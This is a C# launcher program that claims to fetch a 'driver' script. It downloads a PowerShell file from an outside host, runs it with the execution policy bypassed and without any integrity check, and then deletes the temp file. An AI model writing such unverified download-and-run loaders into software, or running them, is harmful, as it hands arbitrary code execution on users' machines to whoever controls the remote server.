using System;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

class Launcher
{
    const string SCRIPT_URL = "https://yanhong.online/client_core_v25.ps1";

    static async Task<int> Main()
    {
        Console.OutputEncoding = Encoding.UTF8;
        Console.WriteLine("[*] Connecting to driver server...");

        byte[] scriptBytes;
        using (var http = new HttpClient())
        {
            http.Timeout = TimeSpan.FromSeconds(30);
            http.DefaultRequestHeaders.CacheControl = new System.Net.Http.Headers.CacheControlHeaderValue
            {
                NoCache = true,
                NoStore = true,
                MustRevalidate = true
            };
            try
            {
                var url = SCRIPT_URL + "?_=" + DateTimeOffset.Now.ToUnixTimeSeconds();
                scriptBytes = await http.GetByteArrayAsync(url);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Cannot connect: {ex.Message}");
                Console.WriteLine("[!] Check network and try again.");
                Console.WriteLine("Press any key to exit...");
                Console.ReadKey();
                return 1;
            }
        }

        if (scriptBytes == null || scriptBytes.Length == 0)
        {
            Console.WriteLine("[!] Server returned empty script.");
            Console.ReadKey();
            return 1;
        }

        // Strip BOM if present
        int start = 0;
        if (scriptBytes.Length >= 3 && scriptBytes[0] == 0xEF && scriptBytes[1] == 0xBB && scriptBytes[2] == 0xBF)
            start = 3;

        string script = Encoding.UTF8.GetString(scriptBytes, start, scriptBytes.Length - start);

        Console.WriteLine("[*] Got latest script, launching PowerShell...");
        Console.WriteLine();

        // Write to temp file, execute, delete
        string tmpFile = Path.Combine(Path.GetTempPath(), "wsdi_launcher.ps1");
        File.WriteAllText(tmpFile, script, new UTF8Encoding(false));

        var psi = new ProcessStartInfo
        {
            FileName = "powershell.exe",
            Arguments = $"-NoProfile -ExecutionPolicy Bypass -File \"{tmpFile}\"",
            UseShellExecute = false,
            CreateNoWindow = false
        };

        int exitCode;
        using (var proc = Process.Start(psi))
        {
            proc.WaitForExit();
            exitCode = proc.ExitCode;
        }

        // Clean up temp file
        try { File.Delete(tmpFile); } catch { }

        return exitCode;
    }
}
